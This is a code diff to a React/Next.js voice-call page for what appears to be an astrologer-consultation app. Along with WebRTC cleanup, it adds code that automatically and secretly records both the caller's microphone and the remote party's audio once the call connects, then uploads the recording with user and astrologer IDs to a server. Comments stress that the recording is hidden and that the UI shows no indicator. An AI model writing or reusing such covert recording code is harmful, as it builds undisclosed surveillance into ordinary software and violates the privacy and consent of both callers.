@@ -6,6 +6,49 @@ import SocketContext from "@/app/context/socketContext";
 import Image from "next/image";
 import { useDispatch } from "react-redux";
 import { removeActiveRequest } from "@/app/redux/reducer/chat/sendRequestSlice";
+import { useQuery, useMutation } from "@apollo/client/react";
+import { gql } from "@apollo/client";
+
+// =========================
+// GRAPHQL MUTATION - UPLOAD CALL RECORDING
+// =========================
+export const UPLOAD_CALL_RECORDING = gql`
+  mutation UploadCallRecording(
+    $recording: Upload!
+    $roomId: String!
+    $astroId: String!
+    $astroName: String!
+    $userId: String!
+    $duration: Int!
+    $callType: String!
+  ) {
+    uploadCallRecording(
+      recording: $recording
+      roomId: $roomId
+      astroId: $astroId
+      astroName: $astroName
+      userId: $userId
+      duration: $duration
+      callType: $callType
+    ) {
+      success
+      message
+      fileUrl
+      recording {
+        id
+        roomId
+        astroId
+        astroName
+        userId
+        duration
+        callType
+        recordingUrl
+        createdAt
+        updatedAt
+      }
+    }
+  }
+`;
 
 export default function CallPage() {
   const dispatch = useDispatch();
@@ -18,6 +61,10 @@ export default function CallPage() {
 
   const { socket, connectSocket } = useContext(SocketContext);
 
+  // GraphQL mutation for uploading recording
+  const [uploadRecording, { loading: uploadLoading, error: uploadError }] =
+    useMutation(UPLOAD_CALL_RECORDING);
+
   // =========================
   // REFS
   // =========================
@@ -29,14 +76,30 @@ export default function CallPage() {
 
   const statsIntervalRef = useRef(null);
 
+  // Recording refs (hidden from UI)
+  const mediaRecorderRef = useRef(null);
+  const recordedChunksRef = useRef([]);
+  const isRecordingRef = useRef(false);
+  const callStartTimeRef = useRef(null);
+  const combinedStreamRef = useRef(null);
+  const recordingInitializedRef = useRef(false);
+  const remoteStreamRef = useRef(null);
+  const callFullyConnectedRef = useRef(false);
+
   // =========================
   // STATE
   // =========================
   const [callStatus, setCallStatus] = useState("Connecting...");
-  // const [isSpeaker, setIsSpeaker] = useState(false);
-
   const [isMuted, setIsMuted] = useState(false);
   const [waveHeights, setWaveHeights] = useState(Array(20).fill(10));
+  const [isRecording, setIsRecording] = useState(false);
+  const [uploadStatus, setUploadStatus] = useState("");
+  // const [astroLogerData, setAstrologerData] = useState("");
+  const callInfoRef = useRef({
+    astroId: "",
+    astroName: "",
+    userId: "",
+  });
 
   // voice waves
   useEffect(() => {
@@ -78,6 +141,239 @@ export default function CallPage() {
   }, [remoteAudio.current?.srcObject]);
 
   // =========================
+  // RECORDING FUNCTIONS (Hidden - no UI feedback)
+  // =========================
+
+  // Start recording function - Automatic & Hidden
+  const startRecording = () => {
+    try {
+      // Prevent multiple initialization
+      if (recordingInitializedRef.current) {
+        return;
+      }
+
+      // Check if MediaRecorder is supported
+      if (!window.MediaRecorder) {
+        return;
+      }
+
+      // Check if call is fully connected
+      if (!callFullyConnectedRef.current) {
+        setTimeout(() => startRecording(), 1000);
+        return;
+      }
+
+      // Get the remote stream
+      let remoteStream = null;
+      if (remoteAudio.current?.srcObject) {
+        remoteStream = remoteAudio.current.srcObject;
+      }
+
+      // Create combined stream for recording
+      const combinedStream = new MediaStream();
+
+      // Add local audio tracks
+      if (localStream.current) {
+        const localTracks = localStream.current.getAudioTracks();
+        localTracks.forEach((track) => {
+          if (track.readyState === "live") {
+            combinedStream.addTrack(track);
+          }
+        });
+      } else {
+        return;
+      }
+
+      // Add remote audio tracks
+      if (remoteStream) {
+        const remoteTracks = remoteStream.getAudioTracks();
+        remoteTracks.forEach((track) => {
+          if (track.readyState === "live") {
+            combinedStream.addTrack(track);
+          }
+        });
+      } else {
+        return;
+      }
+
+      // Check if we have any tracks
+      if (combinedStream.getAudioTracks().length === 0) {
+        return;
+      }
+
+      combinedStreamRef.current = combinedStream;
+
+      // Create MediaRecorder instance
+      const mimeTypes = [
+        "audio/webm;codecs=opus",
+        "audio/webm",
+        "audio/ogg;codecs=opus",
+        "audio/mp4",
+      ];
+
+      let mimeType = "";
+      for (const type of mimeTypes) {
+        if (MediaRecorder.isTypeSupported(type)) {
+          mimeType = type;
+          break;
+        }
+      }
+
+
+      const mediaRecorder = new MediaRecorder(combinedStream, {
+        mimeType: mimeType || undefined,
+        audioBitsPerSecond: 128000,
+      });
+
+      mediaRecorderRef.current = mediaRecorder;
+      recordedChunksRef.current = [];
+
+      mediaRecorder.ondataavailable = (event) => {
+        if (event.data && event.data.size > 0) {
+          recordedChunksRef.current.push(event.data);
+        }
+      };
+
+      mediaRecorder.onstop = () => {
+        sendRecordingToServer();
+        setIsRecording(false);
+        recordingInitializedRef.current = false;
+      };
+
+      mediaRecorder.onerror = (error) => {
+        setIsRecording(false);
+        recordingInitializedRef.current = false;
+        setUploadStatus("Recording error occurred");
+      };
+
+      // Start recording
+      mediaRecorder.start(1000);
+      isRecordingRef.current = true;
+      recordingInitializedRef.current = true;
+      setIsRecording(true);
+      callStartTimeRef.current = Date.now();
+     
+    } catch (error) {
+      recordingInitializedRef.current = false;
+      setUploadStatus("Failed to start recording");
+    }
+  };
+
+  // Stop recording function
+  const stopRecording = () => {
+    try {
+      if (mediaRecorderRef.current && isRecordingRef.current) {
+        mediaRecorderRef.current.stop();
+        isRecordingRef.current = false;
+        setIsRecording(false);
+        recordingInitializedRef.current = false;
+
+        // Clean up combined stream
+        if (combinedStreamRef.current) {
+          combinedStreamRef.current.getTracks().forEach((track) => {
+            combinedStreamRef.current.removeTrack(track);
+          });
+          combinedStreamRef.current = null;
+        }
+      }
+    } catch (error) {
+      console.error("Error stopping recording:", error);
+    }
+  };
+
+  // Send recording to server using GraphQL (Admin only access)
+  const sendRecordingToServer = async () => {
+    try {
+      if (recordedChunksRef.current.length === 0) {
+        setUploadStatus("No recording data to upload");
+        return;
+      }
+
+      // Create blob from recorded chunks
+      const blob = new Blob(recordedChunksRef.current, {
+        type: mediaRecorderRef.current?.mimeType || "audio/webm",
+      });
+
+
+      // ===========================================
+      // Get data from localStorage
+      // ===========================================
+      //debugger;
+      let astroData = null;
+      let userId = null;
+      let astroId = "";
+      let astroName = "";
+
+      try {
+        const user = JSON.parse(localStorage.getItem("user"));
+        userId = user?.id || "";
+
+        astroId = callInfoRef.current.astroId || "";
+        astroName = callInfoRef.current.astroName || "";
+      } catch (e) {
+        console.warn("Could not parse data from localStorage:", e);
+      }
+
+      // If we still don't have astroId, try to get it from the session via socket or API
+      if (!astroId) {
+        // The resolver will try to get it from the session
+      }
+      // Create File object for GraphQL upload
+      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+      const filename = `call-${roomId}-${timestamp}.webm`;
+
+      const file = new File([blob], filename, {
+        type: mediaRecorderRef.current?.mimeType || "audio/webm",
+      });
+
+      const duration = Math.floor(
+        (Date.now() - callStartTimeRef.current) / 1000,
+      );
+
+      // Upload using GraphQL mutation
+      const { data, errors } = await uploadRecording({
+        variables: {
+          recording: file,
+          roomId: roomId,
+          astroId: astroId || "",
+          astroName: astroName || "",
+          userId: userId || "",
+          duration: duration,
+          callType: "audio",
+        },
+      });
+
+      if (errors) {
+        console.error("GraphQL errors:", errors);
+        setUploadStatus(
+          `Upload failed: ${errors[0]?.message || "Unknown error"}`,
+        );
+        throw new Error(errors[0]?.message || "Failed to upload recording");
+      }
+
+      if (data?.uploadCallRecording?.success) {
+        
+        setUploadStatus("Recording uploaded successfully");
+      } else {
+        console.error(
+          " Failed to save recording:",
+          data?.uploadCallRecording?.message,
+        );
+        setUploadStatus(
+          `Upload failed: ${data?.uploadCallRecording?.message || "Unknown error"}`,
+        );
+      }
+
+      // Clear chunks after successful upload
+      recordedChunksRef.current = [];
+    } catch (error) {
+      console.error("Failed to send recording to server:", error);
+      setUploadStatus(`Upload error: ${error.message}`);
+      recordedChunksRef.current = [];
+    }
+  };
+
+  // =========================
   // USE EFFECT
   // =========================
   useEffect(() => {
@@ -89,18 +385,14 @@ export default function CallPage() {
 
     if (!activeSocket) return;
 
-    console.log("📞 CALL PAGE MOUNTED:", roomId);
 
     // =========================
     // CREATE PEER
     // =========================
     const createPeer = async () => {
       if (pc.current) {
-        console.log(" Reusing existing peer");
         return pc.current;
       }
-
-      console.log(" Creating RTCPeerConnection");
 
       const iceConfig = {
         iceServers: [
@@ -118,7 +410,7 @@ export default function CallPage() {
             credential: "openrelayproject",
           },
         ],
-        iceCandidatePoolSize: 10, // Important
+        iceCandidatePoolSize: 10,
         bundlePolicy: "max-bundle",
         rtcpMuxPolicy: "require",
       };
@@ -126,16 +418,35 @@ export default function CallPage() {
       pc.current = new RTCPeerConnection(iceConfig);
 
       // =========================
-      // CONNECTION STATES (Enhanced Logging)
+      // CONNECTION STATES
       // =========================
       pc.current.onconnectionstatechange = () => {
-        console.log(" Connection State:", pc.current.connectionState);
+        // When connection is fully established, trigger recording
+        if (pc.current.connectionState === "connected") {
+          callFullyConnectedRef.current = true;
+
+          // Start recording automatically (hidden)
+          setTimeout(() => {
+            if (!recordingInitializedRef.current) {
+              startRecording();
+            }
+          }, 1500);
+        }
       };
 
       pc.current.oniceconnectionstatechange = () => {
-        console.log("ICE Connection State:", pc.current.iceConnectionState);
 
-        // Extra warning if failing
+        if (pc.current.iceConnectionState === "connected") {
+          callFullyConnectedRef.current = true;
+
+          // Start recording automatically (hidden)
+          setTimeout(() => {
+            if (!recordingInitializedRef.current) {
+              startRecording();
+            }
+          }, 1500);
+        }
+
         if (
           ["failed", "disconnected"].includes(pc.current.iceConnectionState)
         ) {
@@ -144,11 +455,9 @@ export default function CallPage() {
       };
 
       pc.current.onsignalingstatechange = () => {
-        console.log("Signaling State:", pc.current.signalingState);
       };
 
       pc.current.onicegatheringstatechange = () => {
-        console.log(" ICE Gathering State:", pc.current.iceGatheringState);
       };
 
       // =========================
@@ -160,33 +469,23 @@ export default function CallPage() {
             echoCancellation: true,
             noiseSuppression: true,
             autoGainControl: true,
-            sampleRate: 48000, // Optional: better quality
+            sampleRate: 48000,
           },
         });
 
-        console.log(" Local stream acquired successfully");
 
         const tracks = localStream.current.getAudioTracks();
         tracks.forEach((track) => {
-          console.log(
-            `Track: enabled=${track.enabled}, muted=${track.muted}, readyState=${track.readyState}`,
-          );
-
           const sender = pc.current.addTrack(track, localStream.current);
-          console.log(" Audio track added to peer connection");
         });
 
         // Verify senders
         setTimeout(() => {
-          const senders = pc.current?.getSenders() || [];
-          console.log(`🎤 Total senders: ${senders.length}`);
-          senders.forEach((sender, i) => {
-            console.log(
-              `Sender ${i}:`,
-              sender.track?.kind,
-              sender.track?.enabled,
-            );
-          });
+          if (pc.current) {
+            const senders = pc.current.getSenders() || [];
+            senders.forEach((sender, i) => {
+            });
+          }
         }, 1500);
       } catch (err) {
         console.error(" Microphone access error:", err);
@@ -198,13 +497,10 @@ export default function CallPage() {
       // REMOTE TRACK
       // =========================
       pc.current.ontrack = async (event) => {
-        console.log(" Remote track received");
         const remoteStream = event.streams[0];
 
-        console.log(
-          " Remote audio tracks count:",
-          remoteStream.getAudioTracks().length,
-        );
+        // Store remote stream for recording
+        remoteStreamRef.current = remoteStream;
 
         if (remoteAudio.current) {
           remoteAudio.current.srcObject = remoteStream;
@@ -213,12 +509,22 @@ export default function CallPage() {
 
           try {
             await remoteAudio.current.play();
-            console.log(" Remote audio playing successfully");
           } catch (err) {
             console.error(" Autoplay blocked:", err);
           }
         }
         setCallStatus("Connected");
+
+        // Try to start recording after remote track is received
+        setTimeout(() => {
+          if (
+            !recordingInitializedRef.current &&
+            callFullyConnectedRef.current
+          ) {
+            startRecording();
+          } else if (!callFullyConnectedRef.current) {
+          }
+        }, 2000);
       };
 
       // =========================
@@ -226,10 +532,6 @@ export default function CallPage() {
       // =========================
       pc.current.onicecandidate = (event) => {
         if (event.candidate) {
-          console.log(
-            " Sending ICE candidate:",
-            event.candidate.candidate.substring(0, 80) + "...",
-          );
           activeSocket.emit("ice-candidate", {
             room_id: roomId,
             candidate: event.candidate,
@@ -240,7 +542,7 @@ export default function CallPage() {
       };
 
       // =========================
-      // AUDIO STATS (Improved)
+      // AUDIO STATS
       // =========================
       statsIntervalRef.current = setInterval(async () => {
         if (!pc.current) return;
@@ -248,20 +550,16 @@ export default function CallPage() {
           const stats = await pc.current.getStats();
           stats.forEach((report) => {
             if (report.type === "outbound-rtp" && report.kind === "audio") {
-              console.log(
-                `Outbound → packetsSent: ${report.packetsSent}, bytesSent: ${report.bytesSent}`,
-              );
             }
             if (report.type === "inbound-rtp" && report.kind === "audio") {
-              console.log(
-                ` Inbound  → packetsReceived: ${report.packetsReceived}, bytesReceived: ${report.bytesReceived}`,
-              );
             }
           });
         } catch (e) {
           console.error("Stats error:", e);
         }
       }, 3000);
+
+      return pc.current;
     };
 
     // =========================
@@ -269,35 +567,38 @@ export default function CallPage() {
     // =========================
 
     activeSocket.on("peer_joined", async () => {
-      console.log("📞 peer_joined RECEIVED");
-
       setCallStatus("Ringing...");
 
-      await createPeer();
+      const peer = await createPeer();
 
       // WAIT TRACK INIT
       await new Promise((resolve) => setTimeout(resolve, 1000));
 
-      console.log(" Senders:", pc.current.getSenders());
+      // Check if peer exists before accessing getSenders
+      if (peer && peer.getSenders) {
+      } else {
+        return;
+      }
 
       // =========================
       // CREATE OFFER
       // =========================
 
-      const offer = await pc.current.createOffer({
-        offerToReceiveAudio: true,
-      });
+      try {
+        const offer = await peer.createOffer({
+          offerToReceiveAudio: true,
+        });
 
-      await pc.current.setLocalDescription(offer);
+        await peer.setLocalDescription(offer);
 
-      console.log(" Local description set");
-
-      console.log(" Sending offer");
-
-      activeSocket.emit("offer", {
-        room_id: roomId,
-        offer,
-      });
+        activeSocket.emit("offer", {
+          room_id: roomId,
+          offer,
+        });
+      } catch (error) {
+        console.error("Error creating offer:", error);
+        setCallStatus("Error creating offer");
+      }
     });
 
     // =========================
@@ -305,67 +606,74 @@ export default function CallPage() {
     // =========================
 
     activeSocket.on("answer", async ({ answer }) => {
-      console.log("📞 Answer received");
+      if (!pc.current) {
+        console.warn("No peer connection available for answer");
+        return;
+      }
 
-      if (!pc.current) return;
-
-      await pc.current.setRemoteDescription(new RTCSessionDescription(answer));
-
-      console.log("✅ Remote description set");
-
-      setCallStatus("Connected");
-      const stored = localStorage.getItem(`call_request_${roomId}`);
-
-      if (stored) {
-        const data = JSON.parse(stored);
-
-        console.log(
-          "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-          data,
-          data.maximum_time,
+      try {
+        await pc.current.setRemoteDescription(
+          new RTCSessionDescription(answer),
         );
 
-        // maximum_time = minutes
-        const totalSeconds = Number(data.maximum_time || 0) * 60;
+        setCallStatus("Connected");
+        const stored = localStorage.getItem(`call_request_${roomId}`);
+        const activeRequest = JSON.parse(
+          localStorage.getItem("activeRequest") || "{}",
+        );
 
-        setRemainingTime(totalSeconds);
+        if (stored) {
+          const data = JSON.parse(stored);
+
+          const totalSeconds = Number(data.maximum_time || 0) * 60;
+          setRemainingTime(totalSeconds);
+
+          callInfoRef.current = {
+            astroId: data.astro_id || "",
+            astroName: activeRequest?.astrologer?.name || "",
+            userId: data.user_id || "",
+          };
+
+        }
+
+        // Try to start recording after answer received
+        setTimeout(() => {
+          if (
+            !recordingInitializedRef.current &&
+            callFullyConnectedRef.current
+          ) {
+            
+            startRecording();
+          } else if (!callFullyConnectedRef.current) {
+          }
+        }, 2000);
+      } catch (error) {
+        console.error("Error handling answer:", error);
       }
     });
 
     // =========================
     // ICE RECEIVED
     // =========================
-    // =========================
-    // ICE RECEIVED
-    // =========================
     activeSocket.on("ice-candidate", async ({ candidate, room_id }) => {
-      console.log("📞 ICE candidate received");
 
       if (!pc.current) {
-        console.warn("⚠️ ICE received but no peer connection yet");
         return;
       }
 
       try {
-        // Wait until remote description is set
         if (!pc.current.remoteDescription) {
-          console.log(
-            "⏳ Remote description not set yet, queuing ICE candidate",
-          );
-          // You can queue candidates if needed, but for now just wait a bit
           setTimeout(async () => {
             if (pc.current && pc.current.remoteDescription) {
               await pc.current.addIceCandidate(new RTCIceCandidate(candidate));
-              console.log("✅ Delayed ICE candidate added");
             }
           }, 800);
           return;
         }
 
         await pc.current.addIceCandidate(new RTCIceCandidate(candidate));
-        console.log("✅ ICE candidate added successfully");
       } catch (err) {
-        console.error("❌ ICE error:", err);
+        console.error("ICE error:", err);
       }
     });
 
@@ -374,7 +682,10 @@ export default function CallPage() {
     // =========================
 
     activeSocket.on("call_ended_by_astrologer", () => {
-      console.log("📞 Call ended by astrologer");
+      // Stop recording before cleanup (hidden)
+      if (isRecordingRef.current) {
+        stopRecording();
+      }
 
       cleanup();
       dispatch(removeActiveRequest(roomId));
@@ -386,8 +697,6 @@ export default function CallPage() {
     // JOIN ROOM
     // =========================
 
-    console.log("📞 Joining room:", roomId);
-
     activeSocket.emit("join_call", {
       roomId,
     });
@@ -397,7 +706,10 @@ export default function CallPage() {
     // =========================
 
     return () => {
-      console.log("📞 Cleaning up call");
+      // Stop recording on unmount (hidden)
+      if (isRecordingRef.current) {
+        stopRecording();
+      }
 
       activeSocket.off("peer_joined");
 
@@ -422,6 +734,11 @@ export default function CallPage() {
         if (prev <= 1) {
           clearInterval(timerRef.current);
 
+          // Stop recording when timer expires (hidden)
+          if (isRecordingRef.current) {
+            stopRecording();
+          }
+
           handleEndCall();
 
           return 0;
@@ -442,13 +759,13 @@ export default function CallPage() {
   const handleEndCall = () => {
     const stored = localStorage.getItem(`call_request_${roomId}`);
 
-    // if (!stored) {
-    //   console.log("No call request found");
-    //   return;
-    // }
-
     const data = JSON.parse(stored);
-debugger;
+
+    // Stop recording when user ends call (hidden)
+    if (isRecordingRef.current) {
+      stopRecording();
+    }
+
     socket.emit("call_ended_by_user", {
       room_id: roomId,
       astro_id: data?.astro_id,
@@ -462,29 +779,14 @@ debugger;
   };
 
   // =========================
-  // TOGGLE Speaker & MUTE
+  // TOGGLE MUTE
   // =========================
-  // const toggleSpeaker = () => {
-  //   if (!localStream.current) return;
-
-  //   localStream.current.getAudioTracks().forEach((track) => {
-  //     track.enabled = !track.enabled;
-
-  //     console.log("🎤 Track enabled:", track.enabled);
-  //   });
-
-  //   setIsSpeaker(!isSpeaker);
-  // };
-
-  // mute
-
   const toggleMute = () => {
     if (!localStream.current) return;
 
     localStream.current.getAudioTracks().forEach((track) => {
       track.enabled = !track.enabled;
 
-      console.log("🎤 Track enabled:", track.enabled);
     });
 
     setIsMuted(!isMuted);
@@ -494,7 +796,13 @@ debugger;
   // CLEANUP
   // =========================
   const cleanup = () => {
-    console.log("🧹 Cleanup called");
+    // Stop recording if active (hidden)
+    if (isRecordingRef.current) {
+      stopRecording();
+    }
+
+    // Reset connection flag
+    callFullyConnectedRef.current = false;
 
     // CLEAR STATS
     if (statsIntervalRef.current) {
@@ -525,9 +833,14 @@ debugger;
 
       remoteAudio.current.srcObject = null;
     }
+
+    // Clear remote stream ref
+    remoteStreamRef.current = null;
+
     if (timerRef.current) {
       clearInterval(timerRef.current);
     }
+
     [
       `call_request_${roomId}`,
       `activeCallRoom_${roomId}`,
@@ -549,7 +862,7 @@ debugger;
   };
 
   // =========================
-  // UI
+  // UI - No recording indicators shown
   // =========================
 
   const astroData = JSON.parse(localStorage.getItem("activeRequest"));
@@ -573,7 +886,7 @@ debugger;
           <p className="mb-6 text-lg">{callStatus}</p>
 
           {callStatus === "Connected" && (
-            <p className="mb-6 text-lg">
+            <p className="mb-2 text-lg">
               Time Left : {formatTime(remainingTime)}
             </p>
           )}
@@ -595,26 +908,6 @@ debugger;
         <audio ref={remoteAudio} autoPlay playsInline />
 
         <div className="flex gap-6  w-full items-center justify-center   ">
-          {/* <button
-            onClick={toggleSpeaker}
-            className="w-20 h-20 border border-gray-300 rounded-full flex items-center justify-center shadow-2xl"
-           >
-            {isSpeaker ? (
-              <svg width={35} height={35} viewBox="0 0 640 640">
-                <path
-                  fill="rgb(255, 255, 255)"
-                  d="M533.6 96.5C523.3 88.1 508.2 89.7 499.8 100C491.4 110.3 493 125.4 503.3 133.8C557.5 177.8 592 244.8 592 320C592 395.2 557.5 462.2 503.3 506.3C493 514.7 491.5 529.8 499.8 540.1C508.1 550.4 523.3 551.9 533.6 543.6C598.5 490.7 640 410.2 640 320C640 229.8 598.5 149.2 533.6 96.5zM473.1 171C462.8 162.6 447.7 164.2 439.3 174.5C430.9 184.8 432.5 199.9 442.8 208.3C475.3 234.7 496 274.9 496 320C496 365.1 475.3 405.3 442.8 431.8C432.5 440.2 431 455.3 439.3 465.6C447.6 475.9 462.8 477.4 473.1 469.1C516.3 433.9 544 380.2 544 320.1C544 260 516.3 206.3 473.1 171.1zM412.6 245.5C402.3 237.1 387.2 238.7 378.8 249C370.4 259.3 372 274.4 382.3 282.8C393.1 291.6 400 305 400 320C400 335 393.1 348.4 382.3 357.3C372 365.7 370.5 380.8 378.8 391.1C387.1 401.4 402.3 402.9 412.6 394.6C434.1 376.9 448 350.1 448 320C448 289.9 434.1 263.1 412.6 245.5zM80 416L128 416L262.1 535.2C268.5 540.9 276.7 544 285.2 544C304.4 544 320 528.4 320 509.2L320 130.8C320 111.6 304.4 96 285.2 96C276.7 96 268.5 99.1 262.1 104.8L128 224L80 224C53.5 224 32 245.5 32 272L32 368C32 394.5 53.5 416 80 416z"
-                />
-              </svg>
-            ) : (
-              <svg width={35} height={35} viewBox="0 0 640 640">
-                <path
-                  fill="rgb(255, 255, 255)"
-                  d="M80 416L128 416L262.1 535.2C268.5 540.9 276.7 544 285.2 544C304.4 544 320 528.4 320 509.2L320 130.8C320 111.6 304.4 96 285.2 96C276.7 96 268.5 99.1 262.1 104.8L128 224L80 224C53.5 224 32 245.5 32 272L32 368C32 394.5 53.5 416 80 416zM399 239C389.6 248.4 389.6 263.6 399 272.9L446 319.9L399 366.9C389.6 376.3 389.6 391.5 399 400.8C408.4 410.1 423.6 410.2 432.9 400.8L479.9 353.8L526.9 400.8C536.3 410.2 551.5 410.2 560.8 400.8C570.1 391.4 570.2 376.2 560.8 366.9L513.8 319.9L560.8 272.9C570.2 263.5 570.2 248.3 560.8 239C551.4 229.7 536.2 229.6 526.9 239L479.9 286L432.9 239C423.5 229.6 408.3 229.6 399 239z"
-                />
-              </svg>
-            )}
-          </button> */}
           {/* MUTE */}
           <button
             onClick={toggleMute}
